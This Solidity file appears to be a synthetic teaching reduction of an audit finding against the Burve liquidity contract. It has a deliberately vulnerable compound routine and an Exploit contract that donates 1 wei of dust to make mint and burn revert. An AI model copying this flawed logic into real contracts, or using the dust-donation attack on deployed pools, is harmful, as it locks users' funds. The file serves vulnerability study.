// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve (single) — DoS on mint()/burn() via overestimated compound liquidity
    (Pashov, Mar 2025; #57722)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: collectAndCalcCompound() computes nominal liquidity from the
    contract's token balances as if the full balance can be minted across
    weighted Uniswap V3 ranges. With multiple ranges, 1 wei dust overestimates
    mintable liquidity; per-range mint tries to transfer more than available
    → "STF" revert → mint/burn DoS.

    Finding example:
      balances = 1 wei; 2 equal ranges; mintNominalLiq = 14;
      real mintable = 0 (1 wei cannot split across 2 ranges).

    FIX: caller-supplied liquidity cap, or dust floor before compound.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "STF");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "STF");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Multi-range LP; compounds residual dust on every mint/burn.
contract Burve {
    MockERC20 public token0;
    MockERC20 public token1;
    uint256 public totalShares;
    mapping(address => uint256) public balanceOf;
    uint256 public rangeCount;
    uint256 public compoundedLiq;
    bool public lastCompoundReverted;

    // Tracks "in-range" liquidity tokens (not compoundable residual).
    uint256 public deployed0;
    uint256 public deployed1;

    constructor(MockERC20 t0, MockERC20 t1, uint256 ranges) {
        token0 = t0;
        token1 = t1;
        rangeCount = ranges;
    }

    /// @dev Residual = total balance - deployed (fee dust / donations).
    function residual0() public view returns (uint256) {
        uint256 b = token0.balanceOf(address(this));
        return b > deployed0 ? b - deployed0 : 0;
    }

    function residual1() public view returns (uint256) {
        uint256 b = token1.balanceOf(address(this));
        return b > deployed1 ? b - deployed1 : 0;
    }

    /// @dev collectAndCalcCompound — overestimates from residual dust.
    function collectAndCalcCompound() public view returns (uint256 mintNominalLiq) {
        uint256 bal0 = residual0();
        uint256 bal1 = residual1();
        uint256 amount0InUnitLiqX64 = 1e18;
        uint256 amount1InUnitLiqX64 = 1e18;
        uint256 nominalLiq0 = (bal0 << 64) / amount0InUnitLiqX64;
        uint256 nominalLiq1 = (bal1 << 64) / amount1InUnitLiqX64;
        uint256 nominal = nominalLiq0 < nominalLiq1 ? nominalLiq0 : nominalLiq1;
        if (nominal > 2 * rangeCount) {
            mintNominalLiq = nominal - 2 * rangeCount; // @> VULN: residual wei treated as fully mintable across ranges
            // FIX: dust floor, or caller-supplied compound liq cap
        } else {
            mintNominalLiq = 0;
        }
    }

    function _compound() internal returns (uint256 liq) {
        liq = collectAndCalcCompound();
        compoundedLiq = liq;
        if (liq == 0) return 0;
        // Overestimate: requires `liq` wei of residual token0, but only 1 wei exists.
        uint256 req0 = liq;
        uint256 r0 = residual0();
        if (req0 > r0) {
            lastCompoundReverted = true;
            revert("STF"); // @> VULN consequence: mint/burn DoS
        }
        // success: mark residual as deployed
        deployed0 += req0;
    }

    function mint(address to, uint256 shares) external {
        _compound();
        token0.transferFrom(msg.sender, address(this), shares);
        token1.transferFrom(msg.sender, address(this), shares);
        deployed0 += shares;
        deployed1 += shares;
        totalShares += shares;
        balanceOf[to] += shares;
    }

    function burn(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "bal");
        _compound(); // reverts when dust overestimates
        balanceOf[msg.sender] -= shares;
        totalShares -= shares;
        deployed0 -= shares;
        deployed1 -= shares;
        token0.transfer(msg.sender, shares);
        token1.transfer(msg.sender, shares);
    }
}

contract Exploit {
    MockERC20 public token0; // CREATE 1
    MockERC20 public token1; // CREATE 2
    Burve public burve; // CREATE 3 — vulnerable

    bool public burnDoS;
    bool public mintDoS;
    uint256 public overestimatedLiq;

    constructor() {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
        burve = new Burve(token0, token1, 2);
    }

    function run() external {
        uint256 shares = 2 ether;
        token0.mint(address(this), shares + 1 ether + 2);
        token1.mint(address(this), shares + 1 ether + 2);
        token0.approve(address(burve), type(uint256).max);
        token1.approve(address(burve), type(uint256).max);

        // 1. Mint succeeds (no residual dust)
        burve.mint(address(this), shares);
        require(burve.balanceOf(address(this)) == shares, "shares");
        require(burve.residual0() == 0, "no residual yet");

        // 2. Attacker donates 1 wei dust (not counted as deployed)
        token0.transfer(address(burve), 1);
        token1.transfer(address(burve), 1);
        require(burve.residual0() == 1, "dust");

        // bal=1 → nominal=(1<<64)/1e18=18; mintNominal=18-4=14
        overestimatedLiq = burve.collectAndCalcCompound();
        require(overestimatedLiq == 14, "overestimate 14");

        // 3. Burn reverts — DoS on exit
        try burve.burn(shares / 2) {
            burnDoS = false;
        } catch {
            burnDoS = true;
        }
        require(burnDoS, "burn DoS");
        // Note: lastCompoundReverted is rolled back by the revert; try/catch is the oracle.

        // 4. Further mint also reverts
        try burve.mint(address(this), 1 ether) {
            mintDoS = false;
        } catch {
            mintDoS = true;
        }
        require(mintDoS, "mint DoS");
        require(burnDoS && mintDoS && overestimatedLiq == 14, "harm: mint+burn DoS");
    }
}
